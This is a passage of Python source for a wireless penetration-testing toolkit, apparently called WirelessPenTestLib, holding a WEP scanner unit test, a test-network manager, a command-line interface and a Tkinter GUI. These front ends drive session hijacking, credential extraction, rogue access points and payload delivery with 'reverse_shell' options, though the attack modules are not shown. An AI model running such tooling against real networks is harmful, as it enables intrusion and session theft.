        self.mock_core_framework.network_manager.interface = "wlan0mon"

        # Initialize WEPScanner with mocked CoreFramework
        self.wep_scanner = WEPScanner(core_framework=self.mock_core_framework)
        # Assuming WEPScanner has a scan_duration attribute
        self.wep_scanner.scan_duration = 10

    def test_init(self):
        self.assertEqual(self.wep_scanner.core_framework, self.mock_core_framework)
        self.assertEqual(self.wep_scanner.scan_duration, 10)

    def test_scan_no_wep_networks(self):
        target_info = {"ssid": "TestSSID", "bssid": "00:11:22:33:44:55"}
        stop_event = MagicMock()
        stop_event.is_set.return_value = False

        with patch('scapy.all.sniff') as mock_sniff:
            # Simulate sniff not finding any WEP networks
            mock_sniff.side_effect = lambda iface, prn, timeout, stop_filter: None
            result = self.wep_scanner.scan(target_info, stop_event)
            self.assertIn("wep_networks", result)
            self.assertEqual(result["wep_networks"], {})

    def test_scan_with_wep_networks(self):
        target_info = {"ssid": "TestSSID", "bssid": "00:11:22:33:44:55"}
        stop_event = MagicMock()
        stop_event.is_set.return_value = False

        # Create a fake WEP packet
        pkt = Dot11(addr3="00:11:22:33:44:55") / Dot11Beacon() / Dot11Elt(ID="SSID", info="TestSSID") / Dot11Elt(
            ID="Rates", info="some rates") / Dot11Elt(ID="RSN", info="some rsn info")

        with patch('scapy.all.sniff') as mock_sniff:
            # Simulate sniff calling packet_handler with the fake packet
            def side_effect(*args, **kwargs):
                prn = kwargs.get('prn')
                prn(pkt)

            mock_sniff.side_effect = side_effect
            result = self.wep_scanner.scan(target_info, stop_event)
            self.assertIn("wep_networks", result)
            self.assertIn("00:11:22:33:44:55", result["wep_networks"])
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["SSID"], "TestSSID")
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["BSSID"], "00:11:22:33:44:55")
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["Security"],
                             ['WEP'])  # Assuming 'WEP' is in security
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["Key_Strength"], "Unknown")

    def test_assess_key_strength(self):
        pkt = Dot11()
        result = self.wep_scanner.assess_key_strength(pkt)
        self.assertEqual(result, "Unknown")  # Based on the current implementation

    def tearDown(self):
        # Clean up after each test if necessary
        pass


if __name__ == '__main__':
    print("Running WEPScanner tests...")
    print(f"{'*' * 40}\n")

    unittest.main()


# tests/__init__.py


# test_network/manage.py
# test_network/manage.py

import subprocess
import argparse
import os
import sys

def run_command(command, cwd):
    try:
        subprocess.run(command, cwd=cwd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Command '{' '.join(command)}' failed with error: {e}")
        sys.exit(1)

def start_network(compose_file):
    print("Starting test network...")
    run_command(['docker-compose', 'up', '-d'], cwd=os.path.dirname(compose_file))
    print("Test network started successfully.")

def stop_network(compose_file):
    print("Stopping test network...")
    run_command(['docker-compose', 'down'], cwd=os.path.dirname(compose_file))
    print("Test network stopped successfully.")

def status_network(compose_file):
    print("Checking test network status...")
    run_command(['docker-compose', 'ps'], cwd=os.path.dirname(compose_file))
    print("Test network status displayed above.")

def main():
    parser = argparse.ArgumentParser(description="Manage the test network environment.")
    parser.add_argument('action', choices=['start', 'stop', 'status'], help="Action to perform on the test network.")
    parser.add_argument('--compose-file', default='docker-compose.yml', help="Path to the docker-compose file.")

    args = parser.parse_args()

    compose_file = args.compose_file

    if not os.path.exists(compose_file):
        print(f"Docker Compose file '{compose_file}' not found.")
        sys.exit(1)

    if args.action == 'start':
        start_network(compose_file)
    elif args.action == 'stop':
        stop_network(compose_file)
    elif args.action == 'status':
        status_network(compose_file)
    else:
        print(f"Unknown action '{args.action}'.")
        sys.exit(1)

if __name__ == '__main__':
    main()


# test_network/__init__.py


# ui/cli.py
# ui/cli.py

import click
import os
import sys
import json
import yaml
import subprocess
import logging
import pandas as pd
from colorama import Fore
from core.config.protocols import register_scanners
from core.config.protocols import register_exploits


# Configure logging within cli.py if necessary or rely on core/__init__.py's logging
# Set up basic logging to capture errors during initialization
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Ensure the project root is in the Python path for absolute imports
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

def initialize_coreframework():
    from core import CoreFramework  # Import inside the function to avoid circular imports
    protocols_path = os.path.join(project_root, 'core', 'config', 'protocols')  # Correct path to protocols
    return CoreFramework(
        modules_path=protocols_path,  # Correct modules_path
        config_dir=os.path.join(project_root, 'core', 'config'), # Correct config_dir
        scanners=register_scanners(),
        exploits=register_exploits(),

    )

@click.group()
@click.version_option(version='1.0.0', prog_name='WirelessPenTestLib')
@click.pass_context
def cli(ctx):
    """
    WirelessPenTestLib: A Comprehensive Wireless Penetration Testing Library
    """
    protocols_path = os.path.join(project_root, 'core', 'config', 'protocols')

    ctx.ensure_object(dict)
    try:
        # Initialize CoreFramework using the separate function
        core = initialize_coreframework()
        core.load_protocol_modules()
        ctx.obj['core'] = core
        core.logger.info("CLI initialized successfully with project root: %s and protocols path: %s", project_root, protocols_path)
    except Exception as e:
        logger.exception("Error initializing CoreFramework")  # Use logger here instead of core.logger
        click.echo(f"Error initializing CoreFramework: {e}")
        ctx.exit(1)


@cli.command()
@click.option('--scanner', '-s', multiple=True, help='Specify scanners to run (e.g., encryption_scanner, auth_bypass_scanner, dos_scanner).')
@click.option('--target-ssid', prompt='Target SSID', help='SSID of the target wireless network.')
@click.option('--target-bssid', prompt='Target BSSID', help='BSSID of the target wireless network.')
@click.pass_context
def scan(ctx, scanner, target_ssid, target_bssid):
    """
    Execute vulnerability scans on the specified target.
    """
    core = ctx.obj['core']
    vulnerability_db = core.vulnerability_db

    # Define the target
    target = {
        'ssid': target_ssid,
        'bssid': target_bssid
    }

    if not scanner:
        click.echo("No scanners specified. Running all available scanners.")
        scanner = list(core.scanners.keys())

    for sc in scanner:
        if sc not in core.scanners:
            click.echo(f"Scanner '{sc}' not found. Available scanners are:")
            for scanner_name in core.scanners.keys():
                click.echo(f"- {scanner_name}")
            continue
        click.echo(f"\nRunning scanner: {sc}")
        try:
            vulnerabilities = core.run_scanner(sc, target)
            # Merge vulnerabilities into the vulnerability_db
            for key, value in vulnerabilities.items():
                if key not in vulnerability_db:
                    vulnerability_db[key] = []
                vulnerability_db[key].extend(value)
        except Exception as e:
            core.logger.exception(f"Error running scanner '{sc}'")
            click.echo(f"Error running scanner '{sc}': {e}")
            continue  # Skip failed scanner and proceed with the next one
    click.echo("\nAll specified scans have been executed.")

@cli.command()
@click.option('--exploit', '-e', multiple=True, help='Specify exploits to run (e.g., session_hijacking, credential_extraction, payload_delivery).')
@click.option('--target-ssid', prompt='Target SSID', help='SSID of the target wireless network.')
@click.option('--target-bssid', prompt='Target BSSID', help='BSSID of the target wireless network.')
@click.pass_context
def exploit(ctx, exploit, target_ssid, target_bssid):
    """
    Run exploitation modules on identified vulnerabilities.
    """
    core = ctx.obj['core']
    vulnerability_db = core.vulnerability_db

    # Define the target
    target = {
        'ssid': target_ssid,
        'bssid': target_bssid
    }

    if not exploit:
        click.echo("No exploits specified. Available exploits are:")
        for ex in core.exploits.keys():
            click.echo(f"- {ex}")
        ctx.exit(1)

    for ex in exploit:
        if ex not in core.exploits:
            click.echo(f"Exploit '{ex}' not found. Available exploits are:")
            for exploit_name in core.exploits.keys():
                click.echo(f"- {exploit_name}")
            continue

        # Prepare vulnerability information based on exploit type
        vuln_info = {}
        if ex == 'session_hijacking':
            click.echo("\n--- Session Hijacking Configuration ---")
            vuln_info['target_session'] = {
                'target_ip': click.prompt('Target IP', type=str),
                'target_mac': click.prompt('Target MAC Address', type=str),
                'gateway_ip': click.prompt('Gateway IP', type=str),
                'gateway_mac': click.prompt('Gateway MAC Address', type=str)
            }
        elif ex == 'payload_delivery':
            click.echo("\n--- Payload Delivery Configuration ---")
            vuln_info['payload_type'] = click.prompt('Payload Type', type=click.Choice(['reverse_shell', 'malicious_script']))
            vuln_info['duration'] = click.prompt('Exploit Duration (seconds)', default=10, type=int)

        # Run the exploit
        click.echo(f"\nRunning exploit: {ex}")
        try:
            vulnerabilities = core.run_exploit(ex, vuln_info)
            # Merge vulnerabilities into the vulnerability_db
            for key, value in vulnerabilities.items():
                if key not in vulnerability_db:
                    vulnerability_db[key] = []
                vulnerability_db[key].extend(value)
        except Exception as e:
            core.logger.exception(f"Error running exploit '{ex}'")
            click.echo(f"Error running exploit '{ex}': {e}")
            ctx.exit(1)
    click.echo("\nAll specified exploits have been executed.")

@cli.command()
@click.option('--set', 'settings', nargs=2, multiple=True, help='Set configuration settings (e.g., general.interface wlan0mon).')
@click.pass_context
def configure(ctx, settings):
    """
    Configure settings and preferences.
    """
    core = ctx.obj['core']
    if not settings:
        click.echo("Current Configuration:")
        config_path = os.path.join(str(core.config_manager.config_dir), 'config.yaml')
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = yaml.safe_load(f)
                for section, values in config.items():
                    click.echo(f"\n[{section}]")
                    for key, value in values.items():
                        click.echo(f"{key}: {value}")
            except Exception as e:
                core.logger.exception("Error reading configuration")
                click.echo(f"Error reading configuration: {e}")
                ctx.exit(1)
        else:
            click.echo("No configuration found.")
        return

    for key, value in settings:
        try:
            core.config_manager.set_config(key, value)
            click.echo(f"Set '{key}' to '{value}'.")
        except ValueError as ve:
            core.logger.exception(f"Error setting '{key}'")
            click.echo(f"Error setting '{key}': {ve}")
            continue

    click.echo("\nConfiguration updated successfully.")

@cli.command()
@click.option('--format', '-f', type=click.Choice(['json', 'txt']), default='txt', help='Format of the report.')
@click.pass_context
def report(ctx, format):
    """
    View and export scan and exploit reports.
    """
    core = ctx.obj['core']
    click.echo("Generating report...")

    report_data = {
        'scans': {},
        'exploits': {}
    }

    # Categorize scan and exploit data
    for scan_type, vulnerabilities in core.vulnerability_db.items():
        if scan_type.startswith('scan'):
            report_data['scans'][scan_type] = vulnerabilities
        elif scan_type.startswith('exploit'):
            report_data['exploits'][scan_type] = vulnerabilities

    if format == 'json':
        report_path = os.path.normpath(os.path.join(str(core.config_manager.general.report_directory), 'json', 'report.json'))
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        try:
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=4)
            click.echo(f"JSON report exported to {report_path}")
        except Exception as e:
            core.logger.exception("Error exporting JSON report")
            click.echo(f"Error exporting JSON report: {e}")
    else:
        report_path = os.path.normpath(os.path.join(str(core.config_manager.general.report_directory), 'txt', 'report.txt'))
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        try:
            with open(report_path, 'w') as f:
                for scan_type, vulnerabilities in report_data['scans'].items():
                    f.write(f"Scanner: {scan_type}{os.linesep}")
                    for vuln in vulnerabilities:
                        f.write(f"  - SSID: {vuln.get('ssid', 'N/A')}{os.linesep}")
                        f.write(f"    BSSID: {vuln.get('bssid', 'N/A')}{os.linesep}")
                        f.write(f"    Protocol: {vuln.get('protocol', 'N/A')}{os.linesep}")
                        f.write(f"    Description: {vuln.get('description', 'N/A')}{os.linesep}")
                for exploit_type, vulnerabilities in report_data['exploits'].items():
                    f.write(f"Exploit: {exploit_type}{os.linesep}")
                    for vuln in vulnerabilities:
                        f.write(f"  - BSSID: {vuln.get('bssid', 'N/A')}{os.linesep}")
                        f.write(f"    Description: {vuln.get('description', 'N/A')}{os.linesep}")
                        f.write(f"    Action: {vuln.get('action', 'N/A')}{os.linesep}")
            click.echo(f"TXT report exported to {report_path}")
        except Exception as e:
            core.logger.exception("Error exporting TXT report")
            click.echo(f"Error exporting TXT report: {e}")

@cli.command()
@click.pass_context
def list(ctx):
    """
    List available scanners and exploits.
    """
    core = ctx.obj['core']
    click.echo("\nAvailable Scanners:")
    for sc in core.scanners.keys():
        click.echo(f"- {sc}")

    click.echo("\nAvailable Exploits:")
    for ex in core.exploits.keys():
        click.echo(f"- {ex}")


# Before
@cli.command()
@click.option('--action', type=click.Choice(['start', 'stop', 'status', 'help']), required=True, help="Action to perform on the test network.")
@click.pass_context
def test_network(ctx, action):
    """
    Manage the test network environment.
    """
    core = ctx.obj['core']
    compose_file = os.path.join(project_root, 'test_network', 'docker-compose.yml')
    manage_script = os.path.join(project_root, 'test_network', 'manage.py')

    if not os.path.exists(compose_file):
        click.echo(f"Docker Compose file '{compose_file}' not found.")
        ctx.exit(1)

    if action == 'help':
        click.echo("Usage: test_network [OPTIONS] ACTION")
        click.echo("Actions:")
        click.echo("  start     Start the test network.")
        click.echo("  stop      Stop the test network.")
        click.echo("  status    Check the status of the test network.")
        ctx.exit(0)

    try:
        subprocess.run([sys.executable, manage_script, action, '--compose-file', compose_file], check=True)
    except subprocess.CalledProcessError as e:
        core.logger.error(f"Error running manage.py script: {e}")
        click.echo(f"Error running manage.py script: {e}")
        ctx.exit(1)

    click.echo(f"Test network {action}ed successfully.")


# local network scan
@cli.command()
@click.pass_context
def local_scan(ctx):
    """
    Perform a local network scan using LocalScanner.
    """
    import click  # Ensure click is available
    core = ctx.obj.get('core')
    if not core:
        logger.error("Core framework is not initialized.")
        click.echo("Error: Core framework is not initialized.")
        ctx.exit(1)

    # Access the LocalScanner class; ensure 'local_network' is registered correctly
    try:
        local_scanner_class = core.scanners['local']  # Ensure this key is correct
    except KeyError:
        logger.error("LocalScanner ('local_network') is not registered in core.scanners.")
        click.echo("Error: LocalScanner ('local_network') is not registered. Please check your scanner registrations.")
        ctx.exit(1)

    # List available interfaces using the LocalScanner's static method
    try:
        available_interfaces = local_scanner_class.list_interfaces()
    except Exception as e:
        logger.exception("Failed to list network interfaces.")
        click.echo(f"Error: Failed to list network interfaces. Details: {e}")
        ctx.exit(1)

    if not available_interfaces:
        logger.info("No network interfaces found.")
        click.echo("No network interfaces found.")
        return

    # Create a DataFrame for available interfaces
    interfaces_df = pd.DataFrame({
        'Index': range(1, len(available_interfaces) + 1),
        'Interface Name': available_interfaces
    })

    click.echo(Fore.CYAN + "\nAvailable Network Interfaces:")
    click.echo(interfaces_df.to_string(index=False))

    # Prompt the user to select an interface using click's prompt
    try:
        selected_idx = click.prompt(
            f"\nSelect an interface [1-{len(available_interfaces)}]",
            type=click.IntRange(1, len(available_interfaces))
        )
        selected_interface = available_interfaces[selected_idx - 1]
    except click.exceptions.BadParameter as e:
        logger.error(f"Invalid selection: {e}")
        click.echo("Invalid selection. Please enter a valid number corresponding to the listed interfaces.")
        return

    # Initialize the LocalScanner with the selected interface
    try:
        scanner = local_scanner_class(selected_interface)
    except Exception as e:
        logger.exception(f"Failed to initialize LocalScanner with interface '{selected_interface}'.")
        click.echo(f"Error: Failed to initialize scanner. Details: {e}")
        return

    # Attempt to set monitor mode
    try:
        scanner.set_monitor_mode()
    except Exception as e:
        logger.error(f"Failed to set monitor mode on interface '{selected_interface}': {e}")
        click.echo(f"Error: Failed to set monitor mode on interface '{selected_interface}'. Details: {e}")
        # Decide whether to exit or continue; here we continue to show details
        # ctx.exit(1)

    # Retrieve and display interface details
    try:
        details = scanner.get_interface_details()
    except Exception as e:
        logger.error(f"Failed to retrieve interface details for '{selected_interface}': {e}")
        click.echo(f"Error: Failed to retrieve interface details for '{selected_interface}'. Details: {e}")
        return

    if not details:
        logger.info(f"No details found for interface '{selected_interface}'.")
        click.echo(f"No details found for interface '{selected_interface}'.")
        return

    # Convert details to DataFrame
    details_df = pd.DataFrame(details)

    click.echo(Fore.GREEN + f"\nInterface Details for '{selected_interface}':")
    click.echo(details_df.to_string(index=False))

@cli.command()
@click.pass_context
def finalize(ctx):
    """
    Finalize testing activities and generate reports.
    """
    core = ctx.obj['core']
    try:
        core.logger.info("Finalizing and generating reports.")
        core.finalize()
        click.echo("Reports generated successfully.")
    except Exception as e:
        core.logger.exception("Error during finalization")
        click.echo(f"Error during finalization: {e}")
        ctx.exit(1)


# ui/cli.py

...

if __name__ == '__main__':
    cli()


# ui/gui.py
# ui/gui.py

"""
WirelessPenTestLib GUI Module

This module defines the graphical user interface (GUI) for the WirelessPenTestLib application.
It leverages Tkinter to create a tabbed interface that includes various frames for different functionalities:
- Live Network Details
- Live Packet Monitor
- Fake Devices Manager
- Rogue Access Point Manager
- Scans
- Exploits
- Reports
- Settings

The GUI interacts with the CoreFramework to perform network scanning, exploitation, and reporting tasks.

** Important Note:**
Creating rogue access points and performing network penetration testing should only be done
with explicit permission on networks you own or have authorization to test. Unauthorized access
to networks is illegal and unethical.
"""

import sys
import os
import json
import threading
from typing import Optional, Dict, Any

# Add the parent directory to the system path to import core modules
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL

from core.__init__ import CoreFramework
from core.config.protocols import register_scanners, register_exploits
from ui.frames.live_network_frame import LiveNetworkFrame
from ui.frames.live_packet_monitor import LivePacketMonitor
from ui.frames.test_devices import FakeDeviceManager
from ui.frames.rogue_access_point import FakeAccessPoint
# from ui.frames.network_graph_visualization import NetworkGraphVisualizationFrame


def create_test_data() -> Dict[str, Any]:
    """
    Creates and returns test data for WEP and WPA networks.

    Returns:
        Dict[str, Any]: A dictionary containing test data for WEP and WPA networks.
    """
    return {
        "wpa_networks": {
            "00:11:22:33:44:55": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:55",
                "Security": "WPA2",
                "WPS_Enabled": False
            }
        },
        "wep_networks": {
            "00:11:22:33:44:66": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:66",
                "Security": "WEP",
                "Key_Strength": "Weak"
            }
        }
    }


class WirelessPenTestGUI(tk.Tk):
    """
    Main GUI class for the WirelessPenTestLib application.

    Inherits from Tkinter's Tk class and sets up a tabbed interface with various functionalities
    for network penetration testing, including live monitoring, fake device management, and rogue
    access point setup.

    Attributes:
        wep_networks (Optional[Dict[str, Any]]): Stores WEP network information.
        wpa_networks (Optional[Dict[str, Any]]): Stores WPA network information.
        core (Optional[CoreFramework]): Instance of the CoreFramework for backend operations.
        vulnerability_db (Any): Database of known vulnerabilities.
        stop_event (threading.Event): Event to signal threads to stop operations.
    """

    def __init__(self):
        """
        Initializes the WirelessPenTestGUI application.

        Sets up the main window, initializes the CoreFramework, and creates all necessary tabs.
        """
        super().__init__()
        self.wep_networks: Optional[Dict[str, Any]] = None
        self.wpa_networks: Optional[Dict[str, Any]] = None
        self.title("WirelessPenTestLib GUI")
        self.geometry("1200x800")  # Increased size for better usability

        # Initialize stop event to manage thread termination
        self.stop_event = threading.Event()

        # Initialize Core Framework
        self.core = self.initialize_coreframework()
        if not self.core:
            messagebox.showerror("Initialization Error", "Failed to initialize CoreFramework. Exiting.")
            self.destroy()
            return

        # Create a container frame to hold the Notebook (tabbed interface) and Stop button
        container_frame = ttk.Frame(self)
        container_frame.pack(fill=tk.BOTH, expand=True)

        # Create a Notebook (tabbed interface) inside the container frame
        self.notebook = ttk.Notebook(container_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, side='top')

        # Add Live Network Details tab
        self.live_network_frame = LiveNetworkFrame(
            parent=self.notebook,
            core_framework=self.core,
            scan_interval=30  # Scan every 30 seconds
        )
        self.notebook.add(self.live_network_frame, text="Live Network Details")

        # Load vulnerability database from CoreFramework
        self.vulnerability_db = self.core.vulnerability_db

        # Create additional tabs for various functionalities
        self.create_scan_tab(container_frame)
        self.create_exploit_tab(container_frame)
        self.create_report_tab(container_frame)
        self.create_settings_tab(container_frame)
        self.create_live_packet_monitor_tab(container_frame)
        self.create_fake_devices_tab(container_frame)
        self.create_rogue_access_point_tab(container_frame)
        # self.create_network_visualization_tab(container_frame)

        # Add a Stop button at the bottom of the container frame to halt ongoing operations
        self.add_stop_button(container_frame)

    def initialize_coreframework(self) -> Optional[CoreFramework]:
        """
        Initializes the CoreFramework with necessary configurations.

        Returns:
            Optional[CoreFramework]: An instance of CoreFramework if successful, else None.
        """
        # Define paths to configuration directories and vulnerability database
        current_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.abspath(os.path.join(current_dir, '..'))
        protocols_path = os.path.join(project_root, 'core', 'config', 'protocols')
        config_dir = os.path.join(project_root, 'core', 'config')
        vulnerabilities_path = os.path.join(project_root, 'vulnerabilities', 'vulnerabilities.json')

        # Initialize CoreFramework
        try:
            core = CoreFramework(
                modules_path=protocols_path,
                config_dir=config_dir,
                scanners=register_scanners(),
                exploits=register_exploits(),
                vulnerabilities_path=vulnerabilities_path
            )
            core.logger.info("CoreFramework initialized successfully.")
            return core
        except Exception as e:
            messagebox.showerror("Initialization Error", f"Failed to initialize CoreFramework: {e}")
            return None

    def enter_fake_data(self):
        """
        Inserts fake test data into the LiveNetworkFrame for testing purposes.
        """
        test_data = create_test_data()
        self.wpa_networks = test_data["wpa_networks"]
        self.wep_networks = test_data["wep_networks"]
        self.live_network_frame.update_gui(test_data)

    def run_gui_as_test(self):
        """
        Populates the GUI with fake data and starts the main loop.

        Useful for testing the GUI without connecting to real networks.
        """
        self.enter_fake_data()
        self.mainloop()

    def create_scan_tab(self, parent: ttk.Frame):
        """
        Creates the 'Scans' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        scan_frame = ttk.Frame(self.notebook)
        self.notebook.add(scan_frame, text='Scans')

        # Scanner Selection Section
        scanner_label = ttk.Label(scan_frame, text="Select Scanners:")
        scanner_label.pack(pady=5)

        self.scanner_vars: Dict[str, tk.BooleanVar] = {}
        for sc in self.core.scanners.keys():
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(scan_frame, text=sc, variable=var)
            chk.pack(anchor='w', padx=20)
            self.scanner_vars[sc] = var

        # Target Selection Section
        target_frame = ttk.LabelFrame(scan_frame, text="Target Network")
        target_frame.pack(padx=10, pady=10, fill='x')

        ssid_label = ttk.Label(target_frame, text="SSID:")
        ssid_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.scan_ssid_entry = ttk.Entry(target_frame, width=50)
        self.scan_ssid_entry.grid(row=0, column=1, padx=5, pady=5)

        bssid_label = ttk.Label(target_frame, text="BSSID:")
        bssid_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.scan_bssid_entry = ttk.Entry(target_frame, width=50)
        self.scan_bssid_entry.grid(row=1, column=1, padx=5, pady=5)

        # Scan and Finalize Buttons
        scan_button = ttk.Button(scan_frame, text="Run Scans", command=self.run_scans)
        scan_button.pack(pady=10)

        finalize_button = ttk.Button(scan_frame, text="Finalize and Generate Reports",
                                     command=self.finalize_and_generate_reports)
        finalize_button.pack(pady=10)

        # Log Area for Scans
        self.scan_log = tk.Text(scan_frame, height=15, state='disabled')
        self.scan_log.pack(padx=10, pady=10, fill='both', expand=True)

    def add_stop_button(self, parent: ttk.Frame):
        """
        Adds a Stop button at the bottom of the GUI to halt ongoing operations.

        Args:
            parent (ttk.Frame): The parent frame to attach the button.
        """
        stop_button = ttk.Button(parent, text="Stop", command=self.stop_operations)
        stop_button.pack(pady=10, side='bottom')

    def stop_operations(self):
        """
        Handles the Stop button click event.

        Signals all running operations (scans and exploits) to terminate gracefully.
        """
        if not self.stop_event.is_set():
            self.stop_event.set()
            self.log_scan("Stop signal sent. Attempting to halt ongoing operations...")
            self.log_exploit("Stop signal sent. Attempting to halt ongoing operations...")

            # Stop ongoing exploits
            self.core.stop_continuous_packets()

            self.log_scan("Stop signal processed.")
            self.log_exploit("Stop signal processed.")
        else:
            self.log_scan("No ongoing operations to stop.")
            self.log_exploit("No ongoing operations to stop.")

    def run_scans(self):
        """
        Initiates the scanning process based on selected scanners and target network.

        Validates user inputs and starts a separate thread to perform scans to keep the GUI responsive.
        """
        selected_scanners = [sc for sc, var in self.scanner_vars.items() if var.get()]
        ssid = self.scan_ssid_entry.get().strip()
        bssid = self.scan_bssid_entry.get().strip()

        # Input validation
        if not selected_scanners:
            messagebox.showwarning("No Scanners Selected", "Please select at least one scanner.")
            return
        if not ssid or not bssid:
            messagebox.showwarning("Incomplete Target Information", "Please provide both SSID and BSSID.")
            return

        target = {'ssid': ssid, 'bssid': bssid}

        # Reset stop_event before starting new scans
        if self.stop_event.is_set():
            self.stop_event.clear()

        # Start scanning in a separate thread
        threading.Thread(target=self.execute_scans, args=(selected_scanners, target), daemon=True).start()

    def finalize_and_generate_reports(self):
        """
        Finalizes the scanning process and generates reports.

        Initiates a separate thread to handle finalization to keep the GUI responsive.
        """
        threading.Thread(target=self.execute_finalize, daemon=True).start()

    def execute_finalize(self):
        """
        Executes the finalization and report generation process.

        Handles any exceptions and updates the report log accordingly.
        """
        try:
            self.core.finalize()
            self.report_text.config(state='normal')
            self.report_text.insert(tk.END, "Reports generated successfully.\n")
            self.report_text.see(tk.END)
            self.report_text.config(state='disabled')
            messagebox.showinfo("Finalize Complete", "Reports generated successfully.")
        except Exception as e:
            messagebox.showerror("Finalize Error", f"Failed to finalize and generate reports: {e}")

    def execute_scans(self, scanners: list, target: Dict[str, str]):
        """
        Executes the selected scanners against the target network.

        Args:
            scanners (list): List of scanner names to run.
            target (Dict[str, str]): Dictionary containing target SSID and BSSID.
        """
        for sc in scanners:
            if self.stop_event.is_set():
                self.log_scan("Scan operation interrupted by user.")
                break
            self.log_scan(f"Running scanner: {sc}")
            try:
                # Pass the stop_event to the scanner's scan method if possible
                scan_result = self.core.run_scanner(sc, target, self.stop_event)
                self.log_scan(f"Scanner '{sc}' completed.\n")

                # Optionally, display scan results in the log
                for device in scan_result.get("devices", []):
                    device_info = (f"IP: {device.get('ip', 'N/A')}, "
                                   f"MAC: {device.get('mac', 'N/A')}, "
                                   f"Hostname: {device.get('hostname', 'N/A')}, "
                                   f"SSID: {device.get('ssid', 'N/A')}, "
                                   f"BSSID: {device.get('bssid', 'N/A')}")
                    self.log_scan(f"Discovered Device: {device_info}")
            except Exception as e:
                self.log_scan(f"Error running scanner '{sc}': {e}\n")

    def log_scan(self, message: str):
        """
        Logs messages to the scan log area.

        Args:
            message (str): The message to log.
        """
        self.scan_log.config(state='normal')
        self.scan_log.insert(tk.END, message + '\n')
        self.scan_log.see(tk.END)
        self.scan_log.config(state='disabled')

    def create_exploit_tab(self, parent: ttk.Frame):
        """
        Creates the 'Exploits' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        exploit_frame = ttk.Frame(self.notebook)
        self.notebook.add(exploit_frame, text='Exploits')

        # Exploit Selection Section
        exploit_label = ttk.Label(exploit_frame, text="Select Exploits:")
        exploit_label.pack(pady=5)

        self.exploit_vars: Dict[str, tk.BooleanVar] = {}
        for ex in self.core.exploits.keys():
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(exploit_frame, text=ex, variable=var)
            chk.pack(anchor='w', padx=20)
            self.exploit_vars[ex] = var

        # Target Selection Section
        target_frame = ttk.LabelFrame(exploit_frame, text="Target Network")
        target_frame.pack(padx=10, pady=10, fill='x')

        ssid_label = ttk.Label(target_frame, text="SSID:")
        ssid_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.exploit_ssid_entry = ttk.Entry(target_frame, width=50)
        self.exploit_ssid_entry.grid(row=0, column=1, padx=5, pady=5)

        bssid_label = ttk.Label(target_frame, text="BSSID:")
        bssid_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.exploit_bssid_entry = ttk.Entry(target_frame, width=50)
        self.exploit_bssid_entry.grid(row=1, column=1, padx=5, pady=5)

        # Exploit-specific Parameters Section
        params_frame = ttk.LabelFrame(exploit_frame, text="Exploit Parameters")
        params_frame.pack(padx=10, pady=10, fill='x')

        # Session Hijacking Parameters
        ip_label = ttk.Label(params_frame, text="Target IP (for Session Hijacking):")
        ip_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.exploit_ip_entry = ttk.Entry(params_frame, width=50)
        self.exploit_ip_entry.grid(row=0, column=1, padx=5, pady=5)

        mac_label = ttk.Label(params_frame, text="Target MAC Address:")
        mac_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.exploit_mac_entry = ttk.Entry(params_frame, width=50)
        self.exploit_mac_entry.grid(row=1, column=1, padx=5, pady=5)

        gateway_ip_label = ttk.Label(params_frame, text="Gateway IP:")
        gateway_ip_label.grid(row=2, column=0, padx=5, pady=5, sticky='e')
        self.exploit_gateway_ip_entry = ttk.Entry(params_frame, width=50)
        self.exploit_gateway_ip_entry.grid(row=2, column=1, padx=5, pady=5)

        gateway_mac_label = ttk.Label(params_frame, text="Gateway MAC Address:")
        gateway_mac_label.grid(row=3, column=0, padx=5, pady=5, sticky='e')
        self.exploit_gateway_mac_entry = ttk.Entry(params_frame, width=50)
        self.exploit_gateway_mac_entry.grid(row=3, column=1, padx=5, pady=5)

        # Payload Type Selection (for Payload Delivery)
        payload_label = ttk.Label(params_frame, text="Payload Type (for Payload Delivery):")
        payload_label.grid(row=4, column=0, padx=5, pady=5, sticky='e')
        self.payload_type_var = tk.StringVar()
        self.payload_type_combo = ttk.Combobox(params_frame, textvariable=self.payload_type_var, state='readonly')
        self.payload_type_combo['values'] = ['reverse_shell', 'malicious_script']
        self.payload_type_combo.grid(row=4, column=1, padx=5, pady=5)
        self.payload_type_combo.current(0)

        # Exploit Execution Button
        exploit_button = ttk.Button(exploit_frame, text="Run Exploits", command=self.run_exploits)
        exploit_button.pack(pady=10)

        # Log Area for Exploits
        self.exploit_log = tk.Text(exploit_frame, height=15, state='disabled')
        self.exploit_log.pack(padx=10, pady=10, fill='both', expand=True)

    def run_exploits(self):
        """
        Initiates the exploitation process based on selected exploits and target information.

        Validates user inputs and starts a separate thread to perform exploits to keep the GUI responsive.
        """
        selected_exploits = [ex for ex, var in self.exploit_vars.items() if var.get()]
        ssid = self.exploit_ssid_entry.get().strip()
